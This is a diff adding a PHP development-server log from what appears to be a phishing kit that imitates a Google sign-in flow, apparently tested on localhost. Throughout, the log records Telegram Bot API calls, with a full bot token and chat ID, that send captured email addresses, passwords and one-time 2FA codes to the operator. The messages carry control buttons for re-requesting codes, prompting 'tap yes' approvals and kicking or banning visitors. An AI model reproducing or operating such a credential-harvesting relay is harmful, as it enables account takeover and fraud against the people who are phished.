@@ -1,0 +1,347 @@
+[Wed Mar 25 12:12:04 2026] PHP 8.2.23 Development Server (http://0.0.0.0:5000) started
+[Wed Mar 25 12:12:05 2026] 127.0.0.1:55214 Accepted
+[Wed Mar 25 12:12:05 2026] 127.0.0.1:55214 [302]: GET /
+[Wed Mar 25 12:12:05 2026] 127.0.0.1:55214 Closing
+[Wed Mar 25 12:12:05 2026] 127.0.0.1:55224 Accepted
+[Wed Mar 25 12:12:05 2026] 127.0.0.1:55224 [302]: GET /accounts/
+[Wed Mar 25 12:12:05 2026] 127.0.0.1:55224 Closing
+[Wed Mar 25 12:12:05 2026] 127.0.0.1:55234 Accepted
+[Wed Mar 25 12:12:05 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/editMessageText {"chat_id":"6044653279","message_id":71,"text":"<blockquote>🔴🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>✅ Valid<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> Google-Chrome\n<b>OS:<\/b> Windows 10\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/146.0.0.0 Safari\/537.36<\/span>\n\n<blockquote><b>👤 USERNAME (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>USERNAME:<\/b> <code>casazzade345@gmail.com<\/code>\n\n<blockquote><b>🔑 PASSWORD (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>PASSWORD:<\/b> <code>12345645765455767<\/code>\n\n<blockquote><b>📲 G-CODE (2️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>OTP:<\/b> <code>54567<\/code>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[]}}
+[Wed Mar 25 12:12:06 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/pinChatMessage {"chat_id":"6044653279","message_id":71,"disable_notification":true}
+[Wed Mar 25 12:12:07 2026] 127.0.0.1:55234 [302]: GET /accounts/complete.php
+[Wed Mar 25 12:12:07 2026] 127.0.0.1:55234 Closing
+[Wed Mar 25 12:12:07 2026] 127.0.0.1:55238 Accepted
+[Wed Mar 25 12:12:07 2026] 127.0.0.1:55238 [200]: POST /client-area/webhook.php
+[Wed Mar 25 12:12:07 2026] 127.0.0.1:55238 Closing
+[Wed Mar 25 12:13:48 2026] 127.0.0.1:41676 Accepted
+[Wed Mar 25 12:13:48 2026] 127.0.0.1:41676 [200]: GET /accounts/dp.php
+[Wed Mar 25 12:13:48 2026] 127.0.0.1:41676 Closing
+[Wed Mar 25 12:13:48 2026] 127.0.0.1:41678 Accepted
+[Wed Mar 25 12:13:48 2026] 127.0.0.1:41678 [200]: GET /accounts/css/index.css
+[Wed Mar 25 12:13:48 2026] 127.0.0.1:41678 Closing
+[Wed Mar 25 12:13:49 2026] 127.0.0.1:41686 Accepted
+[Wed Mar 25 12:13:49 2026] 127.0.0.1:41686 [200]: GET /accounts/js/jquery-3.6.0.min.js
+[Wed Mar 25 12:13:49 2026] 127.0.0.1:41686 Closing
+[Wed Mar 25 12:13:50 2026] 127.0.0.1:50676 Accepted
+[Wed Mar 25 12:13:50 2026] 127.0.0.1:50676 [200]: GET /accounts/js/loader.js
+[Wed Mar 25 12:13:50 2026] 127.0.0.1:50676 Closing
+[Wed Mar 25 12:13:50 2026] 127.0.0.1:50678 Accepted
+[Wed Mar 25 12:13:50 2026] 127.0.0.1:50678 [200]: GET /accounts/js/dp.js
+[Wed Mar 25 12:13:50 2026] 127.0.0.1:50678 Closing
+[Wed Mar 25 12:13:50 2026] 127.0.0.1:50680 Accepted
+[Wed Mar 25 12:13:50 2026] 127.0.0.1:50680 [200]: GET /accounts/media/7611770.png
+[Wed Mar 25 12:13:50 2026] 127.0.0.1:50680 Closing
+[Wed Mar 25 12:13:52 2026] 127.0.0.1:50686 Accepted
+[Wed Mar 25 12:13:52 2026] 127.0.0.1:50686 [200]: POST /includes/process_data.php?id=71
+[Wed Mar 25 12:13:52 2026] 127.0.0.1:50686 Closing
+[Wed Mar 25 12:13:52 2026] 127.0.0.1:50700 Accepted
+[Wed Mar 25 12:13:52 2026] 127.0.0.1:50700 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:13:52 2026] 127.0.0.1:50700 Closing
+[Wed Mar 25 12:13:53 2026] 127.0.0.1:50716 Accepted
+[Wed Mar 25 12:13:53 2026] 127.0.0.1:50716 [200]: POST /includes/process_data.php?id=71
+[Wed Mar 25 12:13:53 2026] 127.0.0.1:50716 Closing
+[Wed Mar 25 12:13:53 2026] 127.0.0.1:50732 Accepted
+[Wed Mar 25 12:13:53 2026] 127.0.0.1:50732 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:13:53 2026] 127.0.0.1:50732 Closing
+[Wed Mar 25 12:13:54 2026] 127.0.0.1:50740 Accepted
+[Wed Mar 25 12:13:54 2026] 127.0.0.1:50740 [200]: GET /accounts/process.php?for=otp
+[Wed Mar 25 12:13:54 2026] 127.0.0.1:50740 Closing
+[Wed Mar 25 12:13:54 2026] 127.0.0.1:50746 Accepted
+[Wed Mar 25 12:13:54 2026] 127.0.0.1:50746 [200]: GET /accounts/css/index.css
+[Wed Mar 25 12:13:54 2026] 127.0.0.1:50746 Closing
+[Wed Mar 25 12:13:54 2026] 127.0.0.1:50760 Accepted
+[Wed Mar 25 12:13:54 2026] 127.0.0.1:50760 [200]: GET /accounts/js/jquery-3.6.0.min.js
+[Wed Mar 25 12:13:54 2026] 127.0.0.1:50760 Closing
+[Wed Mar 25 12:13:54 2026] 127.0.0.1:50774 Accepted
+[Wed Mar 25 12:13:54 2026] 127.0.0.1:50774 [200]: GET /accounts/js/loader.js
+[Wed Mar 25 12:13:54 2026] 127.0.0.1:50774 Closing
+[Wed Mar 25 12:13:55 2026] 127.0.0.1:50780 Accepted
+[Wed Mar 25 12:13:55 2026] 127.0.0.1:50780 [200]: GET /accounts/media/7611770.png
+[Wed Mar 25 12:13:55 2026] 127.0.0.1:50780 Closing
+[Wed Mar 25 12:13:56 2026] 127.0.0.1:50792 Accepted
+[Wed Mar 25 12:13:56 2026] 127.0.0.1:50792 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:13:56 2026] 127.0.0.1:50792 Closing
+[Wed Mar 25 12:13:57 2026] 127.0.0.1:50794 Accepted
+[Wed Mar 25 12:13:57 2026] 127.0.0.1:50794 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:13:57 2026] 127.0.0.1:50794 Closing
+[Wed Mar 25 12:13:58 2026] 127.0.0.1:50796 Accepted
+[Wed Mar 25 12:13:58 2026] 127.0.0.1:50796 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:13:58 2026] 127.0.0.1:50796 Closing
+[Wed Mar 25 12:13:59 2026] 127.0.0.1:47218 Accepted
+[Wed Mar 25 12:13:59 2026] 127.0.0.1:47218 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:13:59 2026] 127.0.0.1:47218 Closing
+[Wed Mar 25 12:14:00 2026] 127.0.0.1:47222 Accepted
+[Wed Mar 25 12:14:00 2026] 127.0.0.1:47222 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:14:00 2026] 127.0.0.1:47222 Closing
+[Wed Mar 25 12:14:01 2026] 127.0.0.1:47236 Accepted
+[Wed Mar 25 12:14:01 2026] 127.0.0.1:47236 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:14:01 2026] 127.0.0.1:47236 Closing
+[Wed Mar 25 12:14:01 2026] 127.0.0.1:47246 Accepted
+[Wed Mar 25 12:14:01 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/editMessageText {"chat_id":"6044653279","message_id":71,"text":"<blockquote>🟢🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>👁️ Verify it’s you - G-code<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> Google-Chrome\n<b>OS:<\/b> Windows 10\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/146.0.0.0 Safari\/537.36<\/span>\n\n<blockquote><b>👤 USERNAME (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>USERNAME:<\/b> <code>casazzade345@gmail.com<\/code>\n\n<blockquote><b>🔑 PASSWORD (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>PASSWORD:<\/b> <code>12345645765455767<\/code>\n\n<blockquote><b>📲 G-CODE (2️⃣)<\/b> <\/blockquote><blockquote>⛔<\/blockquote><b>OTP:<\/b> <code>54567<\/code>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[[{"text":"❕KICK USER❕","callback_data":"6767bd92a97e455815e84eee6be19155 kick_user"},{"text":"❗BAN USER❗","callback_data":"6767bd92a97e455815e84eee6be19155 ban_user"}]]}}
+[Wed Mar 25 12:14:02 2026] 127.0.0.1:47246 [200]: GET /accounts/otp.php
+[Wed Mar 25 12:14:02 2026] 127.0.0.1:47246 Closing
+[Wed Mar 25 12:14:02 2026] 127.0.0.1:47258 Accepted
+[Wed Mar 25 12:14:02 2026] 127.0.0.1:47258 [200]: GET /accounts/css/index.css
+[Wed Mar 25 12:14:02 2026] 127.0.0.1:47258 Closing
+[Wed Mar 25 12:14:02 2026] 127.0.0.1:47272 Accepted
+[Wed Mar 25 12:14:02 2026] 127.0.0.1:47272 [200]: GET /accounts/js/jquery-3.6.0.min.js
+[Wed Mar 25 12:14:02 2026] 127.0.0.1:47272 Closing
+[Wed Mar 25 12:14:03 2026] 127.0.0.1:47282 Accepted
+[Wed Mar 25 12:14:03 2026] 127.0.0.1:47282 [200]: GET /accounts/js/otp.js
+[Wed Mar 25 12:14:03 2026] 127.0.0.1:47282 Closing
+[Wed Mar 25 12:14:04 2026] 127.0.0.1:47298 Accepted
+[Wed Mar 25 12:14:04 2026] 127.0.0.1:47298 [200]: GET /accounts/media/7611770.png
+[Wed Mar 25 12:14:04 2026] 127.0.0.1:47298 Closing
+[Wed Mar 25 12:14:08 2026] 127.0.0.1:47304 Accepted
+[Wed Mar 25 12:14:08 2026] 127.0.0.1:47304 [200]: GET /accounts/process.php?for=otp
+[Wed Mar 25 12:14:08 2026] 127.0.0.1:47304 Closing
+[Wed Mar 25 12:14:08 2026] 127.0.0.1:47318 Accepted
+[Wed Mar 25 12:14:08 2026] 127.0.0.1:47318 [200]: GET /accounts/css/index.css
+[Wed Mar 25 12:14:08 2026] 127.0.0.1:47318 Closing
+[Wed Mar 25 12:14:08 2026] 127.0.0.1:47334 Accepted
+[Wed Mar 25 12:14:08 2026] 127.0.0.1:47334 [200]: GET /accounts/js/jquery-3.6.0.min.js
+[Wed Mar 25 12:14:08 2026] 127.0.0.1:47334 Closing
+[Wed Mar 25 12:14:08 2026] 127.0.0.1:47350 Accepted
+[Wed Mar 25 12:14:08 2026] 127.0.0.1:47350 [200]: GET /accounts/js/loader.js
+[Wed Mar 25 12:14:08 2026] 127.0.0.1:47350 Closing
+[Wed Mar 25 12:14:09 2026] 127.0.0.1:44956 Accepted
+[Wed Mar 25 12:14:09 2026] 127.0.0.1:44956 [200]: GET /accounts/media/7611770.png
+[Wed Mar 25 12:14:09 2026] 127.0.0.1:44956 Closing
+[Wed Mar 25 12:14:10 2026] 127.0.0.1:44962 Accepted
+[Wed Mar 25 12:14:10 2026] 127.0.0.1:44962 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:14:10 2026] 127.0.0.1:44962 Closing
+[Wed Mar 25 12:14:11 2026] 127.0.0.1:44974 Accepted
+[Wed Mar 25 12:14:11 2026] 127.0.0.1:44974 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:14:11 2026] 127.0.0.1:44974 Closing
+[Wed Mar 25 12:14:12 2026] 127.0.0.1:44986 Accepted
+[Wed Mar 25 12:14:12 2026] 127.0.0.1:44986 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:14:12 2026] 127.0.0.1:44986 Closing
+[Wed Mar 25 12:14:13 2026] 127.0.0.1:45002 Accepted
+[Wed Mar 25 12:14:13 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/editMessageText {"chat_id":"6044653279","message_id":71,"text":"<blockquote>🟢🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>👁️ Verify it’s you - G-code<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> Google-Chrome\n<b>OS:<\/b> Windows 10\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/146.0.0.0 Safari\/537.36<\/span>\n\n<blockquote><b>👤 USERNAME (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>USERNAME:<\/b> <code>casazzade345@gmail.com<\/code>\n\n<blockquote><b>🔑 PASSWORD (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>PASSWORD:<\/b> <code>12345645765455767<\/code>\n\n<blockquote><b>📲 G-CODE (2️⃣)<\/b> <\/blockquote><blockquote>⛔<\/blockquote><b>OTP:<\/b> <code>54567<\/code>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[[{"text":"❕KICK USER❕","callback_data":"6767bd92a97e455815e84eee6be19155 kick_user"},{"text":"❗BAN USER❗","callback_data":"6767bd92a97e455815e84eee6be19155 ban_user"}]]}}
+[Wed Mar 25 12:14:14 2026] 127.0.0.1:45002 [200]: GET /accounts/otp.php
+[Wed Mar 25 12:14:14 2026] 127.0.0.1:45002 Closing
+[Wed Mar 25 12:14:15 2026] 127.0.0.1:45018 Accepted
+[Wed Mar 25 12:14:15 2026] 127.0.0.1:45018 [200]: GET /accounts/css/index.css
+[Wed Mar 25 12:14:15 2026] 127.0.0.1:45018 Closing
+[Wed Mar 25 12:14:15 2026] 127.0.0.1:45024 Accepted
+[Wed Mar 25 12:14:15 2026] 127.0.0.1:45024 [200]: GET /accounts/js/jquery-3.6.0.min.js
+[Wed Mar 25 12:14:15 2026] 127.0.0.1:45024 Closing
+[Wed Mar 25 12:14:15 2026] 127.0.0.1:45036 Accepted
+[Wed Mar 25 12:14:15 2026] 127.0.0.1:45036 [200]: GET /accounts/js/otp.js
+[Wed Mar 25 12:14:15 2026] 127.0.0.1:45036 Closing
+[Wed Mar 25 12:14:16 2026] 127.0.0.1:45038 Accepted
+[Wed Mar 25 12:14:16 2026] 127.0.0.1:45038 [200]: GET /accounts/media/7611770.png
+[Wed Mar 25 12:14:16 2026] 127.0.0.1:45038 Closing
+[Wed Mar 25 12:14:33 2026] 127.0.0.1:49442 Accepted
+[Wed Mar 25 12:14:33 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/editMessageText {"chat_id":"6044653279","message_id":71,"text":"<blockquote>🟢🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>👁️ Proccessing<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> Google-Chrome\n<b>OS:<\/b> Windows 10\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/146.0.0.0 Safari\/537.36<\/span>\n\n<blockquote><b>👤 USERNAME (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>USERNAME:<\/b> <code>casazzade345@gmail.com<\/code>\n\n<blockquote><b>🔑 PASSWORD (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>PASSWORD:<\/b> <code>12345645765455767<\/code>\n\n<blockquote><b>📲 G-CODE (3️⃣)<\/b> <\/blockquote><blockquote>🔔<\/blockquote><b>OTP:<\/b> <code>564534<\/code>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[[{"text":"📲 Ask G-Code Again","callback_data":"6767bd92a97e455815e84eee6be19155 ask_otp"}],[{"text":"📲 Ask Tap Yes","callback_data":"6767bd92a97e455815e84eee6be19155 ask_tap"}],[{"text":"✅ Finish","callback_data":"6767bd92a97e455815e84eee6be19155 finish"}],[{"text":"❕KICK USER❕","callback_data":"6767bd92a97e455815e84eee6be19155 kick_user"},{"text":"❗BAN USER❗","callback_data":"6767bd92a97e455815e84eee6be19155 ban_user"}]]}}
+[Wed Mar 25 12:14:33 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/sendMessage {"chat_id":"6044653279","text":"🔔 <b>G-Code Data Updated<\/b>","parse_mode":"HTML","reply_to_message_id":71}
+[Wed Mar 25 12:14:34 2026] 127.0.0.1:49442 [302]: POST /accounts/otp.php
+[Wed Mar 25 12:14:34 2026] 127.0.0.1:49442 Closing
+[Wed Mar 25 12:14:34 2026] 127.0.0.1:49456 Accepted
+[Wed Mar 25 12:14:34 2026] 127.0.0.1:49456 [200]: GET /accounts/process.php?for=otp
+[Wed Mar 25 12:14:34 2026] 127.0.0.1:49456 Closing
+[Wed Mar 25 12:14:34 2026] 127.0.0.1:49472 Accepted
+[Wed Mar 25 12:14:34 2026] 127.0.0.1:49472 [200]: GET /accounts/js/jquery-3.6.0.min.js
+[Wed Mar 25 12:14:34 2026] 127.0.0.1:49472 Closing
+[Wed Mar 25 12:14:34 2026] 127.0.0.1:49476 Accepted
+[Wed Mar 25 12:14:34 2026] 127.0.0.1:49476 [200]: GET /accounts/css/index.css
+[Wed Mar 25 12:14:34 2026] 127.0.0.1:49476 Closing
+[Wed Mar 25 12:14:35 2026] 127.0.0.1:49480 Accepted
+[Wed Mar 25 12:14:35 2026] 127.0.0.1:49480 [200]: GET /accounts/js/loader.js
+[Wed Mar 25 12:14:35 2026] 127.0.0.1:49480 Closing
+[Wed Mar 25 12:14:36 2026] 127.0.0.1:49488 Accepted
+[Wed Mar 25 12:14:36 2026] 127.0.0.1:49488 [200]: GET /accounts/media/7611770.png
+[Wed Mar 25 12:14:36 2026] 127.0.0.1:49488 Closing
+[Wed Mar 25 12:14:37 2026] 127.0.0.1:49498 Accepted
+[Wed Mar 25 12:14:37 2026] 127.0.0.1:49498 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:14:37 2026] 127.0.0.1:49498 Closing
+[Wed Mar 25 12:14:38 2026] 127.0.0.1:49506 Accepted
+[Wed Mar 25 12:14:38 2026] 127.0.0.1:49506 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:14:38 2026] 127.0.0.1:49506 Closing
+[Wed Mar 25 12:14:39 2026] 127.0.0.1:49518 Accepted
+[Wed Mar 25 12:14:39 2026] 127.0.0.1:49518 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:14:39 2026] 127.0.0.1:49518 Closing
+[Wed Mar 25 12:14:40 2026] 127.0.0.1:50022 Accepted
+[Wed Mar 25 12:14:40 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/answerCallbackQuery {"callback_query_id":"7514844077551994103"}
+[Wed Mar 25 12:14:40 2026] 127.0.0.1:50022 [200]: POST /client-area/webhook.php
+[Wed Mar 25 12:14:40 2026] 127.0.0.1:50022 Closing
+[Wed Mar 25 12:14:40 2026] 127.0.0.1:50034 Accepted
+[Wed Mar 25 12:14:40 2026] 127.0.0.1:50034 [200]: POST /includes/process_request.php?id=6767bd92a97e455815e84eee6be19155
+[Wed Mar 25 12:14:40 2026] 127.0.0.1:50034 Closing
+[Wed Mar 25 12:14:40 2026] 127.0.0.1:50042 Accepted
+[Wed Mar 25 12:14:40 2026] 127.0.0.1:50042 [200]: GET /accounts/complete.php
+[Wed Mar 25 12:14:40 2026] 127.0.0.1:50042 Closing
+[Wed Mar 25 12:14:54 2026] 127.0.0.1:34394 Accepted
+[Wed Mar 25 12:14:54 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/answerCallbackQuery {"callback_query_id":"7514844079295020174"}
+[Wed Mar 25 12:14:55 2026] 127.0.0.1:34394 [200]: POST /client-area/webhook.php
+[Wed Mar 25 12:14:55 2026] 127.0.0.1:34394 Closing
+[Wed Mar 25 12:15:08 2026] 127.0.0.1:40774 Accepted
+[Wed Mar 25 12:15:08 2026] 127.0.0.1:40774 [200]: GET /accounts/complete.php
+[Wed Mar 25 12:15:08 2026] 127.0.0.1:40774 Closing
+[Wed Mar 25 12:20:22 2026] 127.0.0.1:36920 Accepted
+[Wed Mar 25 12:20:22 2026] 127.0.0.1:36920 [302]: GET /
+[Wed Mar 25 12:20:22 2026] 127.0.0.1:36920 Closing
+[Wed Mar 25 12:20:22 2026] 127.0.0.1:36936 Accepted
+[Wed Mar 25 12:20:22 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/sendMessage {"chat_id":"6044653279","text":"<blockquote>🟢🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>*️⃣ Action: Please choose a command<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> Google-Chrome\n<b>OS:<\/b> Windows 10\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/146.0.0.0 Safari\/537.36<\/span>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[[{"text":"🔃 Waiting for response...","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a loading"}]]}}
+[Wed Mar 25 12:20:23 2026] 127.0.0.1:36936 [302]: GET /accounts/
+[Wed Mar 25 12:20:23 2026] 127.0.0.1:36936 Closing
+[Wed Mar 25 12:20:23 2026] 127.0.0.1:36952 Accepted
+[Wed Mar 25 12:20:23 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/editMessageText {"chat_id":"6044653279","message_id":81,"text":"<blockquote>🟢🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>👁️ Sign in - Email or phone<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> Google-Chrome\n<b>OS:<\/b> Windows 10\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/146.0.0.0 Safari\/537.36<\/span>\n\n<blockquote><b>👤 USERNAME (0️⃣)<\/b> <\/blockquote><blockquote>🔄️<\/blockquote>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[[{"text":"❕KICK USER❕","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a kick_user"},{"text":"❗BAN USER❗","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a ban_user"}]]}}
+[Wed Mar 25 12:20:24 2026] 127.0.0.1:36952 [200]: GET /accounts/user.php
+[Wed Mar 25 12:20:24 2026] 127.0.0.1:36952 Closing
+[Wed Mar 25 12:20:24 2026] 127.0.0.1:36962 Accepted
+[Wed Mar 25 12:20:24 2026] 127.0.0.1:36962 [200]: GET /accounts/css/index.css
+[Wed Mar 25 12:20:24 2026] 127.0.0.1:36962 Closing
+[Wed Mar 25 12:20:24 2026] 127.0.0.1:36968 Accepted
+[Wed Mar 25 12:20:24 2026] 127.0.0.1:36968 [200]: GET /accounts/js/jquery-3.6.0.min.js
+[Wed Mar 25 12:20:24 2026] 127.0.0.1:36968 Closing
+[Wed Mar 25 12:20:25 2026] 127.0.0.1:36984 Accepted
+[Wed Mar 25 12:20:25 2026] 127.0.0.1:36984 [200]: GET /accounts/js/log.js
+[Wed Mar 25 12:20:25 2026] 127.0.0.1:36984 Closing
+[Wed Mar 25 12:20:25 2026] 127.0.0.1:37000 Accepted
+[Wed Mar 25 12:20:25 2026] 127.0.0.1:37000 [200]: GET /accounts/media/7611770.png
+[Wed Mar 25 12:20:25 2026] 127.0.0.1:37000 Closing
+[Wed Mar 25 12:25:09 2026] 127.0.0.1:37754 Accepted
+[Wed Mar 25 12:25:09 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/editMessageText {"chat_id":"6044653279","message_id":81,"text":"<blockquote>🟢🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>👁️ Proccessing<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> Google-Chrome\n<b>OS:<\/b> Windows 10\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/146.0.0.0 Safari\/537.36<\/span>\n\n<blockquote><b>👤 USERNAME (1️⃣)<\/b> <\/blockquote><blockquote>🔔<\/blockquote><b>USERNAME:<\/b> <code>casazzadebo54556@gmail.com<\/code>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[[{"text":"❕KICK USER❕","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a kick_user"},{"text":"❗BAN USER❗","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a ban_user"}]]}}
+[Wed Mar 25 12:25:09 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/sendMessage {"chat_id":"6044653279","text":"🔔👤","parse_mode":"HTML","reply_to_message_id":81}
+[Wed Mar 25 12:25:10 2026] 127.0.0.1:37754 [302]: POST /accounts/user.php
+[Wed Mar 25 12:25:10 2026] 127.0.0.1:37754 Closing
+[Wed Mar 25 12:25:10 2026] 127.0.0.1:36268 Accepted
+[Wed Mar 25 12:25:10 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/editMessageText {"chat_id":"6044653279","message_id":81,"text":"<blockquote>🟢🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>👁️ Welcome - Enter your password<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> Google-Chrome\n<b>OS:<\/b> Windows 10\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/146.0.0.0 Safari\/537.36<\/span>\n\n<blockquote><b>👤 USERNAME (1️⃣)<\/b> <\/blockquote><blockquote>✅<\/blockquote><b>USERNAME:<\/b> <code>casazzadebo54556@gmail.com<\/code>\n\n<blockquote><b>🔑 PASSWORD (0️⃣)<\/b> <\/blockquote><blockquote>🔄️<\/blockquote>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[[{"text":"❕KICK USER❕","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a kick_user"},{"text":"❗BAN USER❗","callback_data":"c24d186272dad0e6aeff4ad61b4b3d5a ban_user"}]]}}
+[Wed Mar 25 12:25:11 2026] 127.0.0.1:36268 [200]: GET /accounts/password.php
